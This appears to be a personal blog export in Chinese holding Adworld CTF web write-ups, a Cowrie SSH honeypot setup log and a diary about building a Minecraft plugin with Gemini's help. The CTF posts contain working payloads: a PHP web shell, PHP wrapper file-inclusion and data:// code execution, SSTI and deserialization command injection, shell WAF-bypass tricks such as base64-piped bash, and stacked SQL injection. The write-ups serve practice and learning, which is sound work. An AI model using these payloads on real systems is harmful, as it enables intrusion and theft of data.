是文件包含漏洞.\n在这篇文章进行了学习.\n需要利用 php伪协议: php://filter/read=?/resource=?.\n其中, read 是过滤器, 多个过滤器用 | 分隔, resource 是要读取的文件路径.\n构造 language 为 php://filter/convert.base64-encode/resource=flag.\nimport requestsresp = requests.get(    url=\"http://61.147.171.105:61925\",    headers={\"Cookie\": \"language=php://filter/convert.base64-encode/resource=flag\"},)print(resp.text)\n\n在其中找到 PD9waHANCiRmbGFnPSJjeWJlcnBlYWNlezFkZGFkYzdlNjI2MTlmNDVlYWU3OTA2ZDliYTY2MGJkfSI7DQo/Pg==, 解码得到:\n&lt;?php$flag=\"cyberpeace{1ddadc7e62619f45eae7906d9ba660bd}\";?&gt;\n\nFlag: cyberpeace{1ddadc7e62619f45eae7906d9ba660bd}\n\nfileclude&lt;?phpinclude \"flag.php\";highlight_file(__FILE__);if (isset($_GET[\"file1\"]) &amp;&amp; isset($_GET[\"file2\"])) {    $file1 = $_GET[\"file1\"];    $file2 = $_GET[\"file2\"];    if (! empty($file1) &amp;&amp; ! empty($file2)) {        if (file_get_contents($file2) === \"hello ctf\") {            include $file1;        }    } else {        die(\"NONONO\");    }}\n\n$file1 的构造和上一题一样, 接下来思考怎么构造 $file2.\n目标: 让 file_get_contents($file2) 返回字符串 hello ctf.\n这个用 php://input 即可实现.\nimport requestsresp = requests.get(    url=\"http://61.147.171.105:60952/\",    headers={\"Cookie\": \"language=\"},    params={        \"file1\": \"php://filter/convert.base64-encode/resource=flag.php\",        \"file2\": \"php://input\",    },    data=\"hello ctf\",)print(resp.text)\n\n输出中找到 PD9waHAKZWNobyAiV1JPTkcgV0FZISI7Ci8vICRmbGFnID0gY3liZXJwZWFjZXtiOTQzYTBlNzZiMWI1NWZhODljNzQ2N2MyYTRlOGI2OX0=, 解码得到:\n&lt;?phpecho \"WRONG WAY!\";// $flag = cyberpeace{b943a0e76b1b55fa89c7467c2a4e8b69}\n\nFlag: cyberpeace{b943a0e76b1b55fa89c7467c2a4e8b69}\n\neasyphp&lt;?php    highlight_file(__FILE__);    $key1 = 0;    $key2 = 0;    $a = $_GET['a'];    $b = $_GET['b'];    if (isset($a) &amp;&amp; intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3) {        if (isset($b) &amp;&amp; '8b184b' === substr(md5($b), -6, 6)) {            $key1 = 1;        } else {            die(\"Emmm...再想想\");        }    } else {        die(\"Emmm...\");    }    $c = (array) json_decode(@$_GET['c']);    if (is_array($c) &amp;&amp; ! is_numeric(@$c[\"m\"]) &amp;&amp; $c[\"m\"] &gt; 2022) {        if (is_array(@$c[\"n\"]) &amp;&amp; count($c[\"n\"]) == 2 &amp;&amp; is_array($c[\"n\"][0])) {            $d = array_search(\"DGGJ\", $c[\"n\"]);            $d === false ? die(\"no...\") : null;            foreach ($c[\"n\"] as $key =&gt; $val) {                $val === \"DGGJ\" ? die(\"no......\") : null;            }            $key2 = 1;        } else {            die(\"no hack\");        }    } else {        die(\"no\");    }    if ($key1 &amp;&amp; $key2) {        include \"Hgfks.php\";        echo \"You're right\" . \"\\n\";        echo $flag;    }?&gt; Emmm...\n\na的条件目标: intval($a) &gt; 6000000 &amp;&amp; strlen($a) &lt;= 3\n我想到的是用科学技术法, 构造 $a=9e9. 但不同的 php 版本, 这样的结果可能不同.\nb的条件目标: '8b184b' === substr(md5($b), -6, 6), 即 $b 的md5 后 6 位为 8b184b.\n直接爆破! 我这里爆了 3 个出来.\nfrom hashlib import md5import randomimport stringcnt = 0while True:    cnt += 1    s = ''.join(random.sample(string.ascii_letters + string.digits, 8))    b = md5(s.encode('utf-8')).hexdigest()    if b.endswith(\"8b184b\"):        print(f\"str: {s}\\nmd5: {b}\\nAttempts: {cnt}\")        break# str: 7Xxpgw9t# md5: 56d4f0c319d42646b3737e86fd8b184b# Attempts: 9810929# -------------------------------------# str: ZdYtqgH8# md5: d8f209f5f1d41cd958c2fd53868b184b# Attempts: 24920372# -------------------------------------# str: HRKp6bh8# md5: e8cade3139470760697e088f7c8b184b# Attempts: 45048083\n\nc的条件\n是一个 array.\n包含键 m , m 不是数字, 但转为数字后大于 2022.\n包含键 n , n 是一个 array, 且 n 中有两个元素, n[0] 也是一个 array.\n在 c[\"n\"] 里必须有 DGGJ (array_search查找, 其比较是用 == 而不是 ===).\nc[\"n\"] 中不能有 DGGJ.\n\n构造:\n{    \"m\": \"114514qwq\",    \"n\": [[], 0]}\n\n最后的参数为:\na=9e9&amp;b=7Xxpgw9t&amp;c={\"m\":\"114514qwq\",\"n\":[[],0]}\nFlag: cyberpeace{7654290768236bd2dd393bce0018d745}\n\nfile_include&lt;?phphighlight_file(__FILE__);include \"./check.php\";if (isset($_GET['filename'])) {    $filename = $_GET['filename'];    include $filename;}\n\n以为和 fileinclude 一样, 构造 filename 为 php://filter/convert.base64-encode/resource=flag.php.\n结果显示 do not hack!\n盲猜过滤了关键词.\n几次尝试, 得知 base 被过滤.\n那就搜一下除 base64-encode 外其它的 filter: PHP Manual 列举的 filters\nquoted-printable-encode 也被 ban 了, 只能使用 iconv.*. 支持的编码\n直接用官网的例子: php://filter/convert.iconv.utf-16le.utf-8/resource=flag.php\n把输出的乱码扔到乱码恢复网站, 即可得到 flag.\n顺便看看 check.php 长啥样:\n&lt;?phpif ($_GET[\"filename\"]) {    $preg_match_username = 'return preg_match(\"/base|be|encode|print|zlib|quoted|write|rot13|read|string/i\", $_GET[\"filename\"]);';    if (eval($preg_match_username)) {        die(\"do not hack!\");    }}\n\nFlag: cyberpeace{52752fc6688c4ec81d7707ec8db50d5c}\n\nunseping&lt;?phphighlight_file(__FILE__);class ease{    private $method;    private $args;    public function __construct($method, $args)    {        $this-&gt;method = $method;        $this-&gt;args   = $args;    }    public function __destruct()    {        if (in_array($this-&gt;method, [\"ping\"])) {            call_user_func_array([$this, $this-&gt;method], $this-&gt;args);        }    }    public function ping($ip)    {        exec($ip, $result);        var_dump($result);    }    public function waf($str)    {        if (! preg_match_all(\"/(\\||&amp;|;| |\\/|cat|flag|tac|php|ls)/\", $str, $pat_array)) {            return $str;        } else {            echo \"don't hack\";        }    }    public function __wakeup()    {        foreach ($this-&gt;args as $k =&gt; $v) {            $this-&gt;args[$k] = $this-&gt;waf($v);        }    }}$ctf = @$_POST['ctf'];@unserialize(base64_decode($ctf));\n\n又是一道 PHP 反序列化漏洞.\n由 waf 可知, | &amp; ; 空格 / cat flag tac php ls 被过滤了.\n考虑绕过.\n以下是常见的绕过方式:\n\n  \n    \n      空格绕过\n\n    \n    \n      ${IFS}cat${IFS}flagcat${IFS}$1flagcat$IFS$1flag\n\n&lt;&gt;重定向符cat&lt;&gt;flagcat&lt;flag\n\n    \n  \n\n\n  \n    \n      黑名单绕过\n\n    \n    \n      变量拼接a=ca;b=t;c=fl;d=ag;$a$b $c$d\n\n引号ca''t fl\"\"ag\n\n反斜杠ca\\t fl\\ag\n\nBase64echo \"Y2F0IGZsYWc=\"|base64 -d|bash\n\n[终极] printf编码绕过$(printf \"\\154\\163\") # ls$(printf \"\\x6c\\x73\") # ls\n\nPython转换代码:\nCMD = \"ls\" # 命令BASE = 8 # 进制, 8或16res = \"\"if BASE == 8:    res = \"\".join(f\"\\\\{oct(ord(c))[2:]}\" for c in CMD)elif BASE == 16:    res = \"\".join(f\"\\\\x{hex(ord(c))[2:]}\" for c in CMD)print(f'$(printf${{IFS}}\"{res}\")')\n\n    \n  \n\n在这题中, 2 种绕过空格的方式均可用, 黑名单可以用反斜杠或引号绕过.\n$a = new ease(\"ping\", ['l\\\\s${IFS}-l']);echo base64_encode(serialize($a));echo \"\\n\";\n\n上传 payload , 得到:\narray(3) {  [0]=&gt;  string(7) \"total 8\"  [1]=&gt;  string(53) \"drwxr-xr-x 1 root root 4096 Mar 16 08:45 flag_1s_here\"  [2]=&gt;  string(50) \"-rwxr-xr-x 1 root root  863 Aug 18  2022 index.php\"}\n\n看到一个目录 flag_1s_here.\n$a = new ease(\"ping\", ['l\\\\s${IFS}fl\"\"ag_1s_here']);\n\n得到:\narray(1) {  [0]=&gt;  string(25) \"flag_831b69012c67b35f.php\"}\n\n最后还是得用 printf编码绕过.\nexp:\nCMD = \"cat flag_1s_here/flag_831b69012c67b35f.php\" # 命令BASE = 8 # 进制, 8或16res = \"\"if BASE == 8:    res = \"\".join(f\"\\\\{oct(ord(c))[2:]}\" for c in CMD)elif BASE == 16:    res = \"\".join(f\"\\\\x{hex(ord(c))[2:]}\" for c in CMD)print(f'$(printf${{IFS}}\"{res}\")')\n\n&lt;?phpclass ease{    private $method;    private $args;    public function __construct($method, $args)    {        $this-&gt;method = $method;        $this-&gt;args   = $args;    }}$a = new ease(\"ping\", ['$(printf${IFS}\"\\143\\141\\164\\40\\146\\154\\141\\147\\137\\61\\163\\137\\150\\145\\162\\145\\57\\146\\154\\141\\147\\137\\70\\63\\61\\142\\66\\71\\60\\61\\62\\143\\66\\67\\142\\63\\65\\146\\56\\160\\150\\160\")']);echo base64_encode(serialize($a));echo \"\\n\";die;?&gt;\n\nimport requestspayload = \"Tzo0OiJlYXNlIjoyOntzOjEyOiIAZWFzZQBtZXRob2QiO3M6NDoicGluZyI7czoxMDoiAGVhc2UAYXJncyI7YToxOntpOjA7czoxNjk6IiQocHJpbnRmJHtJRlN9IlwxNDNcMTQxXDE2NFw0MFwxNDZcMTU0XDE0MVwxNDdcMTM3XDYxXDE2M1wxMzdcMTUwXDE0NVwxNjJcMTQ1XDU3XDE0NlwxNTRcMTQxXDE0N1wxMzdcNzBcNjNcNjFcMTQyXDY2XDcxXDYwXDYxXDYyXDE0M1w2Nlw2N1wxNDJcNjNcNjVcMTQ2XDU2XDE2MFwxNTBcMTYwIikiO319\"resp = requests.post(    url=\"http://61.147.171.105:53527\",    data={\"ctf\": payload},)print(resp.text)\"\"\"array(2) {  [0]=&gt;  string(5) \"&lt;?php\"  [1]=&gt;  string(47) \"//$cyberpeace{a765167d90c33c4df7ce9297482a4676}\"}\"\"\"\n\nFlag: cyberpeace{a765167d90c33c4df7ce9297482a4676}\n","categories":["CTF"],"tags":["Adworld","Web"]},{"title":"Cowrie SSH 蜜罐部署记录","url":"/2025/07/23/Cowrie-SSH-%E8%9C%9C%E7%BD%90%E9%83%A8%E7%BD%B2%E8%AE%B0%E5%BD%95/","content":"前言听说暴露在公网上的 SSH 端口很容易被爆破, 好奇这个是不是真的, 更好奇被爆破后的机子会被执行什么样的恶意命令, 于是决定在树莓派上部署一个 SSH 蜜罐.\n由于 fakessh 不能模拟假终端, 所以我最后看中了 Cowrie.\n我的计划是, 修改原有的 sshd 端口 (即 22), 给 Cowrie 分配 62223 的端口, 然后把 22 的请求都转发到 62223.\n迁移原 sshd 监听端口编辑 /etc/ssh/sshd_config, 找到 Port 22 这一行, 改成其它你要用的端口.\n如果使用了 ufw 或者 iptables 等防火墙, 记得要修改相应的放行规则.\n在保证不会把自己锁在服务器外后, 执行 sudo systemctl restart sshd 重启 sshd 服务.\n部署没什么好说的, 直接上命令:\n# 创建一个专门用于运行蜜罐的 cowrie 用户sudo adduser --disabled-password cowrie# 加入必要权限组sudo usermod -aG adm cowrie# 切换到 cowrie 用户sudo su - cowrie# clone cowrie, 如果拉不下来, 可以考虑镜像源, 比如 gh-proxy.comgit clone https://github.com/cowrie/cowrie.gitcd cowrie# 创建并激活虚拟环境python3 -m venv cowrie-envsource cowrie-env/bin/activate# 安装依赖pip install --upgrade pip -i https://pypi.tuna.tsinghua.edu.cn/simplepip install -r requirements.txt -i https://pypi.tuna.tsinghua.edu.cn/simple# 复制配置文件cp etc/cowrie.cfg.dist etc/cowrie.cfg\n\n然后编辑配置文件, 这个配置项还是挺庞大的, 我目前只改了 2 个地方, 其它的可以自行摸索一下.\nnano etc/cowrie.cfg\n\n[honeypot]...# timezone = UTCtimezone = UTC+8...[ssh]...# listen_endpoints = tcp:2222:interface=0.0.0.0listen_endpoints = tcp6:62223:interface=\\:\\:# 这个写法是为了监听 ipv4 和 ipv6 的 62223 端口...\n\n当然, 也可以不做端口转发, 直接改成监听 22 端口应该也是可以的.\n如果要做端口转发的话, 我是借助了 iptables 和 iptables-persistent, 注意, 后者和 ufw 冲突, 如果执行下面的命令的话, 会导致 ufw 及其规则被移除!\n以下操作在原来的 root 用户下执行!\n# iptables 只负责 ipv4sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 62223# ipv6 需要用 ip6tables 做转发sudo ip6tables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 62223# iptables 的规则在重启后会丢失, 因此需要用下面这个包做持久化# 注意, 这一步会移除 ufw ! sudo apt-get install iptables-persistent# 保存规则sudo netfilter-persistent save\n\n然后, 运行蜜罐看看吧!\nsudo -u cowrie /home/cowrie/cowrie/bin/cowrie startss -tlnp | grep 62223# 你应该得到这样的输出:# LISTEN 0      50                 *:62223            *:*\n\n然后, 尝试 ssh 连接蜜罐的 22 端口, 看看蜜罐是否正常工作.\n如果出现 WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED! 这样的警告, 就编辑主机的 ~/.ssh/known_hosts, 删掉里面的对应条目.\n蜜罐能正常运行后, 最好再写个 systemd 服务文件, 让它开机自启.\nsudo nano /etc/systemd/system/cowrie.service\n\n写入如下内容:\n[Unit]Description=Cowrie SSH HoneypotAfter=network.target[Service]Type=forkingUser=cowrieGroup=cowrieWorkingDirectory=/home/cowrie/cowriePIDFile=/home/cowrie/cowrie/var/run/cowrie.pidExecStart=/home/cowrie/cowrie/bin/cowrie startExecStop=/home/cowrie/cowrie/bin/cowrie stopRestart=on-failure[Install]WantedBy=multi-user.target\n\n保存后, 依次执行下列命令:\n# 如果刚刚开了蜜罐的话, 先关掉吧sudo -u cowrie /home/cowrie/cowrie/bin/cowrie stopsudo systemctl daemon-reloadsudo systemctl enable cowriesudo systemctl start cowrie\n\n查看日志日志文件位于 /home/cowrie/cowrie/var/log/cowrie/cowrie.log,\n可通过 tail -f /home/cowrie/cowrie/var/log/cowrie/cowrie.log 命令查看最近的日志.\n","categories":["杂项"],"tags":["树莓派"]},{"title":"Adworld Web Writeups 2","url":"/2025/03/18/Adworld-Web-Writeups-2/","content":"NewsCenter题目环境打不开, 暂时鸽.\nupload1查看源码, 发现存在前端校验.\nfunction check() {    upfile = document.getElementById(\"upfile\");    submit = document.getElementById(\"submit\");    name = upfile.value;    ext = name.replace(/^.+\\./, '');    if (['jpg', 'png'].contains(ext)) {        submit.disabled = false;    } else {        submit.disabled = true;        alert('请选择一张图片文件上传!');    }}\n\n前端校验很好绕过, Burp Suite 抓包修改文件后缀即可.\nPHP 一句话木马:\n&lt;?=eval($_POST['cmd']);?&gt;\n\n保存为 hack.jpg, 启动 Burp SUite.\n打开 Proxy 栏的 Intercept 选项, 然后 Open browser.\n上传文件的时候, 把文件名由 hack.jpg 改为 hack.php, 再 Forward.\n显示: upload success : upload/1742228565.hack.php, 看来只有前端校验.\n接下来用 菜刀 连接, 启动虚拟终端即可.\nFlag 在 /var/www/html/flag.php 中.\n(我第一次做的时候, 拿到的flag是 xctf{} 格式, 提交显示错误. 重新开了一个环境才过…)\n\nxff_refererexp:\nimport requestsurl = \"http://61.147.171.105:52452/\"resp = requests.get(    url = url,    headers = {        \"x-forwarded-for\": \"123.123.123.123\",        \"referer\" : \"https://www.google.com\"    })resp.encoding = resp.apparent_encodingprint(resp.text) # 输出中就有 flag 了.\n\ncommand_execution通过 &amp;&amp; 连接多个命令.\n输入: 127.0.0.1 &amp;&amp; find / -name \"*flag*\"\n看到 /home/flag.txt, 知道这个就是 Flag 了.\n再输入 127.0.0.1 &amp;&amp; cat /home/flag.txt 即可得到 Flag.\n\nweb2这是题目:\n&lt;?php$miwen = \"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str){    $_o = strrev($str);    // echo $_o;    for ($_0 = 0; $_0 &lt; strlen($_o); $_0++) {        $_c = substr($_o, $_0, 1);        $__ = ord($_c) + 1;        $_c = chr($__);        $_  = $_ . $_c;    }    return str_rot13(strrev(base64_encode($_)));}highlight_file(__FILE__);/*   逆向加密算法，解密$miwen就是flag*/\n\n简单的解密.\nexp:\n&lt;?php$miwen = \"a1zLbgQsCESEIqRLwuQAyMwLyq2L5VwBxqGA3RQAyumZ0tmMvSGM2ZwB4tws\";function encode($str){    $_o = strrev($str);    // echo $_o;    for ($_0 = 0; $_0 &lt; strlen($_o); $_0++) {        $_c = substr($_o, $_0, 1);        $__ = ord($_c) + 1;        $_c = chr($__);        $_  = $_ . $_c;    }    return str_rot13(strrev(base64_encode($_)));}function decode($str){    $_ = base64_decode(strrev(str_rot13($str)));    // echo $_;    for ($_0 = 0; $_0 &lt; strlen($_); $_0++) {        $_c = substr($_, $_0, 1);        $__ = ord($_c) - 1;        $_c = chr($__);        $_o = $_o . $_c;    }    return strrev($_o);}$flag = decode($miwen);echo $flag; # flag:{NSCTF_b73d5adfb819c64603d7237fa0d52977}\n\n\nWeb_python_template_injection访问 /index.html, 显示 URL http://61.147.171.105:57178/index.html not found.\n盲猜 URL 处用了 Jinja2 模板引擎, 访问 /{{1+1}}, 显示 URL http://61.147.171.105:57178/2 not found, 猜测正确.\n万能exp:\n{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='_IterationGuard' %}{{ c.__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('ls').read()\") }}{% endif %}{% endfor %}\n\n发现 fl4g, 修改上述代码 cat 一下即可.\nFlag: ctf{f22b6844-5169-4054-b2a0-d95b9361cb57}\n\nWeb_php_unserialize&lt;?phpclass Demo{    private $file = 'index.php';    public function __construct($file)    {        $this-&gt;file = $file;    }    public function __destruct()    {        echo @highlight_file($this-&gt;file, true);    }    public function __wakeup()    {        if ($this-&gt;file != 'index.php') {            //the secret is in the fl4g.php            $this-&gt;file = 'index.php';        }    }}if (isset($_GET['var'])) {    $var = base64_decode($_GET['var']);    if (preg_match('/[oc]:\\d+:/i', $var)) {        die('stop hacking!');    } else {        @unserialize($var);    }} else {    highlight_file(\"index.php\");}\n\n代码解释得很清楚了:\n&lt;?phpclass Demo{    private $file = 'index.php';    public function __construct($file)    {        $this-&gt;file = $file;    }}$obj = new Demo('fl4g.php');$str = serialize($obj);echo $str, \"\\n\";# O:4:\"Demo\":1:{s:10:\"Demofile\";s:8:\"fl4g.php\";}# __wakeup 的绕过: 序列中的元素数多于实际元素即可绕过# \"Demo\":1:{ -&gt; \"Demo\":2:{$str = str_replace(':1:', ':2:', $str);# 需要绕过 `o:&lt;数字&gt;:`  可以加个\"+\".# O:4:\"Demo\" -&gt; O:+4:\"Demo\"$str = str_replace('O:', 'O:+', $str);echo base64_encode($str);# TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\n\nimport requestspayload = \"TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==\"url = \"http://61.147.171.105:58693/\"resp = requests.get(url, params={\"var\": payload})print(resp.text) # 可以看到 flag\n\nFlag: ctf{b17bd4c7-34c9-4526-8fa8-a0794a197013}\n\nphp_rce不会\n\nWeb_php_include&lt;?phpshow_source(__FILE__);echo $_GET['hello'];$page = $_GET['page'];while (strstr($page, \"php://\")) {    $page = str_replace(\"php://\", \"\", $page);}include $page;\n\n我有两种思路.\n第一种, strstr是区分大小写的, 可以构造 PHP://input 来绕过.\nimport requestsurl = \"http://61.147.171.105:53803/?page=PHP://input\"resp = requests.post(url, data=\"&lt;? system(\\\"ls\\\"); ?&gt;\")print(resp.text)'''fl4gisisish3r3.phpindex.phpphpinfo.php'''resp = requests.post(url, data=\"&lt;? system(\\\"cat fl4gisisish3r3.php\\\"); ?&gt;\")print(resp.text)'''&lt;?php$flag=\"ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}\";?&gt;'''\n\n第二种, 除了 php:// 外, 还有其它的协议, 其中可以利用的就是 data://, 它会把用户的输入流当作 php 代码执行.\nPOC: data://text/plain;base64,&lt;base64编码的php代码&gt;\nimport requestsimport base64url = \"http://61.147.171.105:53803/\"src1 = \"&lt;? system(\\\"ls\\\"); ?&gt;\"resp = requests.get(    url + \"?page=data://text/plain;base64,\" + base64.b64encode(src1.encode()).decode())print(resp.text)'''fl4gisisish3r3.phpindex.phpphpinfo.php'''src2 = \"&lt;? system(\\\"cat ./fl4gisisish3r3.php\\\"); ?&gt;\"resp = requests.get(    url + \"?page=data://text/plain;base64,\" + base64.b64encode(src2.encode()).decode())print(resp.text)'''&lt;?php$flag=\"ctf{876a5fca-96c6-4cbd-9075-46f0c89475d2}\";?&gt;'''\n\n\nsupersqli填入 1', 出现如下报错: error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''1''' at line 1.\n说明存在 SQL 注入漏洞.\nsqlmap, 启动!\n\n  \n    \n      sqlmap 流程\n\n    \n    \n      sqlmap 用法详见 sqlmap 用户手册\n\nstep #0: 安装. pip install sqlmap 即可.\nstep #1: 探测注入点. sqlmap -u &lt;url&gt;.\nstep #2: 查询当前数据库. sqlmap -u &lt;url&gt; --current-db. 或查询所有数据库. sqlmap -u &lt;url&gt; --dbs.\nstep #3: 查询数据库表. sqlmap -u &lt;url&gt; -D &lt;数据库名&gt; --tables.\nstep #4: 列出数据库表字段. sqlmap -u &lt;url&gt; -D &lt;数据库名&gt; -T &lt;表名&gt; --columns.\nstep #5: 打印数据库表字段内容. sqlmap -u &lt;url&gt; -D &lt;数据库名&gt; -T &lt;表名&gt; --dump.\n\n或者一把梭:\nsqlmap -u &lt;url&gt; -D -T -C --dump --batch --thread 10\n\n    \n  \n\n然而, 我用 sqlmap 没有注出来…\n看来只能手动注了.\n先进行 order by 测试:\n1' order by 2 # : 正常输出1' order by 3 # : 报错\n说明只有 2 列.\n再试试 union 注入:\n1' union select 1,database() # : return preg_match(\"/select|update|delete|drop|insert|where|\\./i\",$inject); 爆出了 WAF. 这下知道为什么 sqlmap 没有注出来了.\n试试 堆叠注入:\n1'; show databases # :\narray(1) {  [0]=&gt;  string(11) \"ctftraining\"}array(1) {  [0]=&gt;  string(18) \"information_schema\"}array(1) {  [0]=&gt;  string(5) \"mysql\"}array(1) {  [0]=&gt;  string(18) \"performance_schema\"}array(1) {  [0]=&gt;  string(9) \"supersqli\"}array(1) {  [0]=&gt;  string(4) \"test\"}\n\n那就是简单的查表查字段了.\n1' ;show tables from ctftraining # : \narray(1) {  [0]=&gt;  string(10) \"FLAG_TABLE\"}array(1) {  [0]=&gt;  string(4) \"news\"}array(1) {  [0]=&gt;  string(5) \"users\"}\n\n1' ;show columns from ctftraining.FLAG_TABLE # : 报 WAF, 因为 . 被 ban 了.\n有点小难受, 但还是有办法.\n1'; use ctftraining; show columns from FLAG_TABLE # :\narray(6) {  [0]=&gt;  string(11) \"FLAG_COLUMN\"  [1]=&gt;  string(12) \"varchar(128)\"  [2]=&gt;  string(2) \"NO\"  [3]=&gt;  string(0) \"\"  [4]=&gt;  string(8) \"not_flag\"  [5]=&gt;  string(0) \"\"}\n\n一个一个查就对了.\n最终, 输入 0'; show columns from 1919810931114514 #, 发现 flag 字段:\narray(6) {  [0]=&gt;  string(4) \"flag\"  [1]=&gt;  string(12) \"varchar(100)\"  [2]=&gt;  string(2) \"NO\"  [3]=&gt;  string(0) \"\"  [4]=&gt;  NULL  [5]=&gt;  string(0) \"\"}\n\n但是, select 被 ban 了, 要怎么获取字段中的数据呢?\n我的做法是, 把 select 拆开来绕过黑名单. 这就要借助 MySQL 的 PREPARE 语句和 CONCAT 函数了.\nPOC:\n1'; PREPARE hack from concat('s', 'elect', ' * from `1919810931114514`'); EXECUTE hack; #\n\nResult:\narray(1) {  [0]=&gt;  string(38) \"flag{c168d583ed0d4d7196967b28cbd0b5e9}\"}\n\nFlag: flag{c168d583ed0d4d7196967b28cbd0b5e9}\n\n","categories":["CTF"],"tags":["Adworld","Web"]},{"title":"ItemRacing 插件开发小记","url":"/2025/07/06/ItemRacing-%E6%8F%92%E4%BB%B6%E5%BC%80%E5%8F%91%E5%B0%8F%E8%AE%B0/","content":"前言前阵子有段时间迷上了 BlockRacing, 这是一个红蓝两队收集方块竞速的小游戏. 这个小游戏的创意真的很棒, 但在游玩过程中, 我发现它的一些机制有些不太符合我的想法:\n\n只有红蓝两个队伍, 不允许只有  个队伍或者多于  个队伍.\n方块库需要靠玩家手动维护, 且有些方块的收集难度评定不合理.\n普通模式太坐牢, 而疾速模式不够 “疾速”, 如果能由玩家自由选择 buff 效果 和开局物品就更好了.\n中途加入的玩家需要管理员用 debug 命令加入, 且还要玩家退出重进才能生效, 有点麻烦.\n部分玩家遇到掉线后物品栏被清空的 bug, 非常影响游戏体验.\n很多东西被硬编码了, 比如可 Roll 次数、初始定位次数和传送次数等等.\n\n因此, 我原计划是 fork 原来的 BlockRacing 项目进行修改, 但是…\n\n我不会 Java, 更不会 Bukkit API.\nBR项目中队伍是硬编码 的, 光是要解决第一个队伍问题, 就需要重构整个项目.\n\n总之, 直接改代码是不可能的, 想解决上述问题, 我需要自己搓一份代码.\n这可能吗?\n正好, 我的程序设计实践课大作业的选题之一是 “做一个自己喜欢的小游戏”, 且 “最好能有 AI 元素”, 我寻思说不定我真能让 AI 帮我搓一份插件出来呢? 在试探了一下 Gemini 2.5 Pro 后, 我发现这个想法是完全 feasible 的, Gemini 2.5 Pro 是真的手把手教学啊, 从新建项目到如何打包, 从提供思路到代码实现, 它全部都能很好地完成, 只要我把我的想法给它, 告诉它 “我准备好了”, 它马上就能搞定我的需求.\n\n    展开图片 \n    \n      \n\n    \n  \n\n于是, 我就决定开发ItemRacing这样的BR-like小游戏插件.\n本篇文章相当于整个开发过程的记录.\n\n0. 准备工作工欲善其事, 必先利其器.\n按照 Gemini 的流程, IDE 要使用 IntelliJ IDEA (vscode 应该也行, 但我不会配置, 而且可能挺麻烦, 不如就用 IDEA), 当然我是买不起 IntelliJ IDEA 的, 所以需要白嫖 学生认证, 但这一步又遇到了些问题, 我的学校邮箱被拉黑了, 无法使用教育邮箱认证, 不过我已经通过了 GitHub 学生认证, 只要把 GitHub 绑定的学校邮箱删掉, 就能用 GitHub 认证 IDEA 了.\n下载安装 IDEA 后, 先装一个主题插件, 再按 Gemini 要求的装个 Minecraft Development 插件, 准备工作就算完成了.\n这些看起来像废话, 所以算第 0 步.\n\n1. 确定开发计划我的设想大概有这些的:\n\n服主可自由设置队伍数量、队伍名称、队伍颜色.\n手动维护方块库感觉太蠢, 直接改成在生存可获取的所有物品里随机分配就行了, 且只要初始的 增益物品和 buff 给到位, 就可以扔掉难度机制 (buff + 抢夺Ⅲ 加持下, 不会速通的萌新也能 25 min 内解放末地).\n轮换次数、初始随机传送和定位次数、每个物品得分、传送和定位消耗等全部交由服主设置, 大大提高了玩家的自由度.\n…\n\n在我把需求告诉 Gemini 后, Gemini 马上列出了初步的开发计划:\n\n    展开图片 \n    \n      \n\n    \n  \n\n想法和计划都确定了, 就可以开始 Ctrl CV了.\n\n2. Gemini 搭框架, 我是躺赢狗 (多图预警)接着就是最重要也是最耗时的一步: 抄 Gemini 的代码.\n虽然我不会写Java, 但只是读个代码逻辑的话, 我还是会的.\n在这一步遇到了不少问题:\n\nGemini 生成的代码并非完美无瑕, 经常把代码粘贴进编译器后就出现一堆警告, 需要我手动把警告信息复制给它, 让它修复. (主要还是因为 Bukkit API 弃用的方法太多了.)\n\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n我经常在它生成完代码后调整需求.\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n需求的变动意味着要重构一堆文件.\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n时不时就要停下来思考具体解决方案.\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n由于是包含几十个文件的工程, 很容易就遗漏部分文件的同步.\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n一些很难从代码层面发现的 bug.\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n在后期, 随着对话轮数的不断增加, Gemini 开始答非所问, 于是我开始自己完成最后的收官工作. (读了这么多 AI 的代码还不会写的话就有点过分了.)\n\n\n    展开图片 \n    \n      \n\n    \n  \n\n\n另外, 我也是在超高强度的使用 Gemini 2.5 Pro 后才知道它是有使用限制的…\n\n\n3. 自己动手, 丰衣足食到了后期, Gemini 罢工了, 那就只能我自己来写代码了. 这个时候写代码就比从头开始写容易太多了:\n\nGemini 已经把整个插件的大致框架都搭建好了.\n通过读 Gemini 提供的代码, 就算原本不会 Java 、 Bukkit API 、 paper 插件的架构 现在也该知道怎么写了.\n\n我只需要实现亿些细节: \n\n提示信息和计分板样式、音效之类的零碎工作.\n重构和实现部分重要函数: 参考 BlockRacing 实现了随机传送, 但 IR 不会像 BR 一样把人传送到海里; 实现了 Gemini 写不出来的 随机生成物品列表与物品完成的判定; 等等…\n依照自己想法修改或添加功能: 比如队伍聊天、游戏重启、游戏开始后再加入队伍等等…\n修一堆 bug: 如计分板的 Rotate 模式展示间隔不对、命令无法自动补全等等…\n…\n\n然后, 还需要反复打包测试各个功能, 确保插件的运行符合预期. (每次测试都能发现 bug 实在是太难绷了, 感觉根本修不完 QAQ …)\n然后, 还要请大家挤出宝贵的时间陪我玩这个辣鸡插件 QwQ.\n\n4. 小结项目概况整个项目含  个类文件, 码量约  KB, 用时约  小时.\n以下是 WakaTime 的统计, 只统计了第一周的 IDEA 打开时间:\n\n    展开图片 \n    \n      \n\n    \n  \n\n一点感想接着谈谈我的一点随想吧.\n这是我这个编程萌新第一次使用 Java、 第一次体验完整开发的过程.  如果放在几年前, 我能在一周之内, 从 Java 